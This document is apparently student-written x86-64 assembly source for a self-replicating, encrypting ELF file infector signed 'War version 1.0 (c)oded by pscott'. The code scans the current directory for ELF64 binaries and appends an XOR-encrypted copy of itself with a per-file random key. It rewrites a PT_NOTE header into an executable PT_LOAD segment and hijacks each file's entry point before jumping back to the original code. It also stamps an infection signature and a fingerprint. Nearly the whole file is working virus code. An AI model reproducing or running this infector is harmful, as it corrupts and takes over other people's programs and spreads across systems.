%include "war.s"

section .text
  global _start

decryptor:
  push rdx
  push rsp

  ; age old trick 
  call .delta ; call will push the address of the next instruction on the stack
  .delta:
    pop rbp ; We pop this address into rbp
    sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime

  mov r9, [rbp + key + proc_self_status - v_stop + 1]
  
  mov r12, v_stop - _start ; size of stuff we wish to decrypt
  lea rsi, [rbp + _start]
  .decrypt:
    xor byte [rsi], r9b
    ror r9, 1 ; rotate key
    inc rsi
    dec r12
    cmp r12, 0
    jne .decrypt

  pop rsp
  pop rdx


_start:
  push rdx
  push rsp
  ; deactivate signals?
  sub rsp, STACK_SIZE ; enough for the stack
  sub rsp, v_stop - decryptor
  mov r15, rsp ; r15 will be the base of our stack

  ; Check whether we are an infected file or not
  lea rsi, [rbp + signature] ; load signature in rsi
  xor r12d, r12d ; init r12 to 0
  cmp byte [rsi + 1], 'W'; check if we need to adjust offset
  je .after_adjust
    mov r12d, proc_self_status - v_stop + 1 ; add the difference
  .after_adjust:
  mov [r15 + OFFSET], r12d ; store the offset

  mov DWORD [r15 + FINGERPRINT_ADD], 0 ; initialize to 0

  ; .is_traced: ; read /proc/self/status and check if TracerPid is not 0
    ; lea rdi, proc_self_status ; load /proc/self/status
    ; mov rsi, O_RDONLY;
    ; xor rdx, rdx ; no flags
    ; mov rax, SYS_OPEN
    ; syscall
; 
    ; cmp rax, 0 ; check error
    ; jl cleanup
; 
    ; mov rdi, rax
    ; lea rsi, [rsp + STACK_SIZE]
    ; mov rdx, STACK_SIZE
    ; mov rax, SYS_READ
    ; syscall
    ; 
; 

  ; check for trace (/proc/self/status)
  ; check for processus tmp

  ; open every folder in /proc
  ; check for /comm and string compare (without \n)

  ; --- Open "."
  push "." ; push "." to stack (rsp)
  mov rdi, rsp
  mov rsi, O_RDONLY ; 
  xor rdx, rdx ;  no flags
  mov rax, SYS_OPEN ;
  syscall ; open

  pop rdi ; pop the "." we pushed earlier
  cmp rax, 0
  jl cleanup

  mov [r15 + DOT_FD], rax ; store FD for later use

  ; --- GetDents64
  loop_getdents:
  mov rdi, [r15 + DOT_FD] ; load fd
  lea rsi, [r15 + DIRENT] ; dirent will be in r15 + DIRENT
  mov rdx, DIRENT_SIZE ; 1024, size of a dirent
  mov rax, SYS_GETDENTS64 ; 
  syscall

  mov [r15 + DIR_SIZE], rax ; store directory size

  ; Check if directory size is < 0
  cmp qword [r15 + DIR_SIZE], 0
  jle close_dot

  xor rcx, rcx ; set rcx to 0

  ; --- Loop through files in the directory
  .loop_directory:
    push rcx ; store rcx, used later at the end of the while
    cmp byte[rcx + r15 + DIRENT_D_TYPE], DT_REG ; check if it's a regular file
    jne .next_file

    ; Open file
    lea rdi, [rcx + r15 + DIRENT_D_NAME] ; load name
    mov rsi, O_RDWR ; Read + Write rights
    xor rdx, rdx ; no flags
    mov rax, SYS_OPEN
    syscall

    cmp rax, 0
    jle .next_file ; if error, go to next file
    mov r9, rax ; store fd in r9

    ; -- Read Header
    mov rdi, r9 ; load fd into rdi
    lea rsi, [r15 + EHDR]; rsi = ehdr
    mov rdx, EHDR_SIZE ; give it the size we wish to read
    mov r10, 0 ; offset 0
    mov rax, SYS_PREAD64 ; scott why pread ?
    syscall

    ; -- Check header
    cmp dword [r15 + EHDR], ELF64_MAGIC ; Compare with ELF magic
    jnz .close_and_next_file ; not an ELF64, go to next one

    ; Check if it's 64 architecture
    cmp byte [r15 + EHDR_CLASS], ELFCLASS64
    jne .close_and_next_file

    ; Check if it has already been infected
    cmp dword [r15 + EHDR_PAD], SCOTT_SIGNATURE
    jz .close_and_next_file ; file has already been infected

    ; Check for endianness scott
    ; cmp byte [r15 + ehdr.ei_data], 1 ; little endian
    ; jne .close_and_next_file

    ; prepare for loop
    mov r8, [r15 + EHDR_PHOFF] ; load phoffset
    xor rbx, rbx ; initialize phdr loop counter
    xor r14, r14 ; initialize phdr file offset

    .loop_phdr:
      ; -- Read one header
      mov rdi, r9 ; load fd into rdi
      lea rsi, [r15 + PHDR_TYPE] ; rsi holds phdr
      mov dx, word [r15 + EHDR_PHENTSIZE] ; program header entry size
      mov r10, r8 ; read at ehdr.phoff from r8
      mov rax, SYS_PREAD64
      syscall

      cmp byte [r15 + PHDR_TYPE], PT_NOTE ; check if type is PT_NOTE
      je .infect ; we found, start infecting

      inc rbx ; add one to phdr loop counter

      cmp bx, word [r15 + EHDR_PHNUM] ; have we looped through all ehdr ?
      jge .close_and_next_file ; couldn't infect because no PT_NOTE found :'(

      add r8w, word [r15 + EHDR_PHENTSIZE] ; increment by ehdr_phentsize
      jmp .loop_phdr ; loop back

    .infect:
      ; Get phdr file offset
      mov ax, bx ; move the loop counter previously in bx to ax
      mov dx, word [r15 + EHDR_PHENTSIZE] ; mov phentsize to dx
      imul dx ; multiply dx by ax (phentsize * number_of_ph)
      mov r14w, ax ; store that in r14
      add r14, [r15 + EHDR_PHOFF] ; now add phoffset

      ; -- Fstat
      mov rdi, r9 ; load fd
      lea rsi, [r15 + STAT] ; stat offset on stack
      mov rax, SYS_FSTAT
      syscall

      cmp rax, 0
      jnz .close_and_next_file ; if fstat failed, go to next file

      ; -- Append Virus
      mov rdi, r9 ; load fd
      mov rsi, 0 ; seek offset 0
      mov rdx, SEEK_END ; go to the end of the file
      mov rax, SYS_LSEEK
      syscall

      cmp rax, 0
      jl .close_and_next_file ; if error go to next file

      call .delta ; call will push the address of the next instruction on the stack
      .delta:
        pop rbp ; We pop this address into rbp
        sub rbp, .delta ; by substracting delta we get the adress of the virus at runtime

      push rax ; store target EOF
      push r9 ; store fd on the stack

      ; generate key
      ; open /dev/urandom
      xor r9, r9
      mov r9d, [r15 + OFFSET] ; load the offset we need to add
      lea rdi, [rbp + dev_urandom + r9] ; "/dev/urandom"
      mov rsi, O_RDONLY
      mov rax, SYS_OPEN
      syscall

      cmp rax, 0
      jge .generate_key
      pop r9
      pop rax
      jmp .close_and_next_file

      .generate_key:
        mov rdi, rax ; load fd
        lea rsi, [r15 + KEY] ; load key address
        mov rdx, 8 ; size
        mov rax, SYS_READ
        syscall

      cmp rax, 0
      jge .store_key
      pop r9
      pop rax
      jmp .close_and_next_file

      .store_key:
        mov rsi, [r15 + KEY]

      ; copy decryptor on the stack
      mov r12, _start - decryptor ; size to copy
      xor rax, rax
      mov eax, [r15 + OFFSET] ; load the offset we need to add
      lea rsi, [rbp + decryptor + rax] 
      lea rax, [r15 + STACK_SIZE]
      xor rdi, rdi ; init rdi
      .memcpy_decryptor:
        mov dil, byte [rsi]
        mov byte[rax], dil
        inc rsi
        inc rax
        dec r12
        cmp r12, 0
        jg .memcpy_decryptor

      mov r12, v_stop - _start ; size to copy
      xor rax, rax
      mov eax, [r15 + OFFSET]
      lea rsi, [rbp + _start + rax] 
      lea rax, [r15 + STACK_SIZE + _start - decryptor] ; only encrypt from _start
      xor rdi, rdi
      .memcpy_and_encrypt:
        mov dil, byte [rsi]
        xor dil, r9b
        ror r9, 1 ; rotate key
        mov byte [rax], dil
        inc rsi
        inc rax
        dec r12
        cmp r12, 0
        jg .memcpy_and_encrypt

      pop r9 ; restore fd in r9

      ; write virus body to the end of the file
      mov rdi, r9 ; load fd
      lea rsi, [r15 + STACK_SIZE]
      mov rdx, v_stop - decryptor; virus size
      pop r10; load target EOF into r10
      mov rax, SYS_PWRITE64
      syscall

      cmp rax, 0
      jge .patch_phdr
      pop rax
      jmp .close_and_next_file

      .patch_phdr:
      ; -- Patch program header
      mov dword [r15 + PHDR_TYPE], PT_LOAD ; change PT_NOTE to PT_LOAD
      mov dword [r15 + PHDR_FLAGS], PF_R | PF_X | PF_W ; Add rwx rights to flags
      mov rax, r10 ; restore target EOF into rax

      mov [r15 + PHDR_OFFSET], rax ; put target EOF into phdr_offset
      mov r13, [r15 + ST_SIZE] ; loading st_size in r13
      add r13, VADDR ; adding VADDR to target file size. Big address to not interfere with program.
      mov [r15 + PHDR_VADDR], r13 ; change vaddr to (stat.st_size + VADDR)

      mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct ; SCOTT check
      add qword [r15 + PHDR_FILESZ], exit - decryptor + JMP_REL_SIZE ; + signature_len + fingerprint_len ; adjust filesize. Add + 5 because of jmp instruction
      add qword [r15 + PHDR_MEMSZ], exit - decryptor + JMP_REL_SIZE; + signature_len + fingerprint_len ; adjust memsize. Add + 5 because of jmp instruction.

      ; -- Write the patched header
      ; pwrite(fd, buf, count, offset)
      mov rdi, r9 ; load fd 
      lea rsi, [r15 + PHDR_TYPE] ; load the phdr in rsi, buf
      mov dx, word [r15 + EHDR_PHENTSIZE] ; count (size of a ph entry)
      mov r10, r14 ; phdr offset
      mov rax, SYS_PWRITE64
      syscall

      cmp rax, 0
      jle .close_and_next_file

      ; -- Patch ehdr
      mov r14, [r15 + EHDR_ENTRY] ; store original ehdr entry in r14
      mov [r15 + EHDR_ENTRY], r13 ; set entry to phdr.vaddr (VADDR)
      mov r13d, SCOTT_SIGNATURE ; load signature
      mov dword [r15 + EHDR_PAD], r13d ; add signature


      ; Write the patched ehdr
      mov rdi, r9 ; load fd
      lea rsi, [r15 + EHDR] ; ehdr offset in stack
      mov rdx, EHDR_SIZE ; size of ehdr we wish to write
      mov r10, 0 ; offset is 0
      mov rax, SYS_PWRITE64
      syscall

      cmp rax, 0
      jl .close_and_next_file

      ; -- Get to the end of the file
      mov rdi, r9 ; load fd
      xor rsi, rsi ; offset 0
      mov rdx, SEEK_END ; end of the file
      mov rax, SYS_LSEEK
      syscall

      cmp rax, 0
      jl .close_and_next_file ; if error go to next file

      ; Create patched jmp
      mov rdx, [r15 + PHDR_VADDR] ; load the virtual address
      add rdx, JMP_REL_SIZE ; add size of jmp rel instruction
      sub r14, rdx ; scott
      sub r14, v_stop - decryptor ; scott
      mov byte [r15 + JMP_REL], 0xe9 ; jmp instruction
      mov dword [r15 + JMP_REL + 1], r14d ; scott why

      ; Write patched jmp to EOF
      mov rdi, r9 ; load fd
      lea rsi, [r15 + JMP_REL] ; rsi = patched jmp in stack buffer
      mov r10, rax ; load EOF
      mov rdx, JMP_REL_SIZE ; size of jmp rel
      mov rax, SYS_PWRITE64
      syscall

      cmp rax, 0
      jl .close_and_next_file ; if error continue

      ; -- Get to the end of the file
      mov rdi, r9 ; load fd
      xor rsi, rsi ; offset 0
      mov rdx, SEEK_END ; end of the file
      mov rax, SYS_LSEEK
      syscall

      xor r10, r10
      mov r10d, [r15 + OFFSET]
      lea rsi, [rbp + proc_self_status + r10] ; load address
      mov r10, rax ; load EOF in rax
      mov rdx, signature - proc_self_status ; want to write 8 bytes
      mov rax, SYS_PWRITE64
      syscall

      ; Write signature
      mov rdi, r9 ; load fd
      xor rsi, rsi ; offset 0
      mov rdx, SEEK_END ; end of the file
      mov rax, SYS_LSEEK
      syscall

      xor rdx, rdx
      mov edx, [r15 + OFFSET]
      lea rsi, [rbp + signature + rdx]
      mov rdx, signature_len ; signature length
      mov r10, rax
      mov rax, SYS_PWRITE64
      syscall

      cmp rax, 0
      jl .close_and_next_file ; if error go to next file

      ; Load fingerprint and write it
      xor rax, rax
      mov eax, [r15 + OFFSET]
      lea rsi, [rbp + fingerprint + rax] ; load fingerprint address in rsi
      add rsi, r12 ; adjust pointer

      mov eax, [r15 + FINGERPRINT_ADD] ; load how much we should increment
      inc eax
      mov [r15 + FINGERPRINT_ADD], eax ; store it back
      mov rax, [rsi] ; load fingerprint
      .byte_from_str: ; load
        xor dl, dl
        sub al, 0x30
        add dl, al

        shr rax, 8
        sub al, 0x30
        shl al, 1
        add dl, al

        shr rax, 8
        sub al, 0x30
        shl al, 2
        add dl, al

        shr rax, 8
        sub al, 0x30
        shl al, 3
        add dl, al

        shr rax, 8
        sub al, 0x30
        shl al, 4
        add dl, al

        shr rax, 8
        sub al, 0x30
        shl al, 5
        add dl, al

        shr rax, 8
        sub al, 0x30
        shl al, 6
        add dl, al

        shr rax, 8
        sub al, 0x30
        shl al, 7
        add dl, al

      .add: ; add the fingerprint offset to rdx
        xor rax, rax
        mov eax, [r15 + FINGERPRINT_ADD]
        add rdx, rax

      .byte_to_str: ; number is in rdx
        xor rax, rax
        xor r8, r8
        mov r8, rdx ; 1
        shr r8, 7 ; 1 0 0 0 0 0 0
        and dl, 127 ; 0 1 1 1 1 1 1
        add r8, 0x30 
        shl r8, 56 ; 0x30 0 0 0 0 0 0 0
        add rax, r8

        xor r8, r8
        mov r8, rdx
        shr r8, 6
        and dl, 63 ; 0 0 1 1 1 1 1 1
        add r8, 0x30
        shl r8, 48
        add rax, r8

        xor r8, r8
        mov r8, rdx
        shr r8, 5
        and dl, 31 ; 0 0 1 1 1 1 1 1
        add r8, 0x30
        shl r8, 40
        add rax, r8

        xor r8, r8
        mov r8, rdx
        shr r8, 4
        and dl, 15 ; 0 0 0 0 1 1 1 1
        add r8, 0x30
        shl r8, 32
        add rax, r8

        xor r8, r8
        mov r8, rdx
        shr r8, 3
        and dl, 7 ; 0 0 0 0 0 1 1 1
        add r8, 0x30
        shl r8, 24
        add rax, r8

        xor r8, r8
        mov r8, rdx
        shr r8, 2
        and dl, 3 ; 0 0 0 0 0 0 1 1
        add r8, 0x30
        shl r8, 16
        add rax, r8

        xor r8, r8
        mov r8, rdx
        shr r8, 1
        and dl, 1 ; 0 0 0 0 0 0 0 1
        add r8, 0x30
        shl r8, 8
        add rax, r8

        xor r8, r8
        mov r8, rdx
        add r8, 0x30
        add rax, r8

      ; write fingerprint
      mov [r15 + FINGERPRINT], rax ; store fingerprint

      ; -- Get to the end of the file
      mov rdi, r9 ; load fd
      xor rsi, rsi ; offset 0
      mov rdx, SEEK_END ; end of the file
      mov rax, SYS_LSEEK
      syscall

      lea rsi, [r15 + FINGERPRINT] ; load address
      mov r10, rax ; load EOF in rax
      mov rdx, 8 ; want to write 8 bytes
      mov rax, SYS_PWRITE64
      syscall

      ; -- Get to the end of the file
      mov rdi, r9 ; load fd
      xor rsi, rsi ; offset 0
      mov rdx, SEEK_END ; end of the file
      mov rax, SYS_LSEEK
      syscall

      ; Write key
      lea rsi, [r15 + KEY] ; load address
      mov r10, rax ; load EOF in rax
      mov rdx, 8 ; want to write 8 bytes
      mov rax, SYS_PWRITE64
      syscall

      cmp rax, 0
      jl .close_and_next_file ; if error go to next file
    
    ; .find_text_section:
    ; .encrypt_text_section:
    ; .append_decryption_stub:

      mov rax, SYS_SYNC ; committing filesystem caches to disk
      syscall

    .close_and_next_file:
      mov rdi, r9 ; load fd from r9
      mov rax, SYS_CLOSE
      syscall

    .next_file:
      pop rcx ; restore rcx that we previously stored
      add cx, word [rcx + r15 + DIRENT_D_RECLEN]
      cmp rcx, [r15 + DIR_SIZE]
      jl .loop_directory
      jmp loop_getdents

close_dot:
  mov rdi, [r15 + DOT_FD]
  mov rax, SYS_CLOSE
  syscall

call show_msg ; pushing db 'salut salut' on stack
info_msg:
  db 'SALUT SALUT', 0xa
  info_len equ $ - info_msg

  show_msg:
    pop rsi ; popping 'salut salut' in rsi
    mov rax, SYS_WRITE
    mov rdi, STDOUT
    mov rdx, info_len
    syscall

cleanup:
  ; restore signals ?
  add rsp, STACK_SIZE ; restore rsp
  add rsp, v_stop - decryptor;
  pop rsp ; restore rsp
  pop rdx ; restore rdx

v_stop:
  jmp exit
proc_self_status:
  db "/proc/self/status", 0
dev_urandom:
  db "/dev/urandom", 0
signature:
  db 0, 'War version 1.0 (c)oded by pscott - '
  signature_len equ $ - signature
fingerprint:
	db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
key:
  db 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0

exit:
  xor rdi, rdi ; exit code 0
  mov rax, SYS_EXIT;
  syscall